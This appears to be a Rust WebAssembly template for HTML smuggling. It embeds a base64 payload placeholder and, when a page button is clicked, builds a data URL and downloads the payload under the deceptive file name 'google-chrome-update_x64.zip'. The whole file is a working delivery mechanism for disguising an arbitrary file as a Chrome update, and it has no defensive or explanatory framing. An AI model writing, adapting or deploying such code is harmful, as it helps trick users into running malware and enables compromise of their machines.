use wasm_bindgen::prelude::*;
extern crate web_sys;
use wasm_bindgen::JsCast;
use web_sys::{Document, HtmlElement};

// Called when the wasm module is instantiated
#[wasm_bindgen(start)]

fn main() -> Result<(), JsValue> {
	
    // Use `web_sys`'s global `window` function to get a handle on the global window object.
    let window = web_sys::window().expect("no global `window` exists");
    let document = window.document().expect("should have a document on window");
	
    //let body = document.body().expect("document should have a body");
	let body = document.get_element_by_id("body_html");
	let head = document.head().expect("document should have a head");

    // Get our payload into a format we can use
    let target = "{{ PAYLOAD }}";
	
	
	// Insert body HTML here
	let body_html = r#"
	
		
	
	
	"#;
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	// Insert head HTML here
	
	let head_html = r#"
	
	
	"#;
	
	// Insert body HTML into body
	body.expect("insert html body").set_inner_html(body_html);
	
	// Insert head HTML into head
	head.set_inner_html(head_html);
	
	
	//Define button element id to trigger file download
	let button = match document.get_element_by_id("download_button") {
        Some(button) => button.dyn_into::<HtmlElement>(),
        None => Err(JsValue::NULL.into()), // Convert JsValue::NULL to JsValue
    }?;
	
	let download_url = format!("data:application/octet-stream;base64,{}", target);
	
    let closure = Closure::wrap(Box::new(move || {
        let document = web_sys::window().expect("should have a window in click context")
                        .document().expect("window should have a document in click context");
        
        let a = document.create_element("a").expect("should be able to create an element");
        a.set_attribute("href", &download_url).expect("should be able to set href");
        a.set_attribute("download", "google-chrome-update_x64.zip").expect("should be able to set download attribute");
        
        let a = a.dyn_into::<web_sys::HtmlElement>().expect("should be able to cast to HtmlElement");
        a.click(); // Programmatically click the <a> to trigger the download
    }) as Box<dyn Fn()>);


    button.add_event_listener_with_callback("click", closure.as_ref().unchecked_ref())?;
    closure.forget(); // Avoid closure being garbage collected
	


    Ok(())
}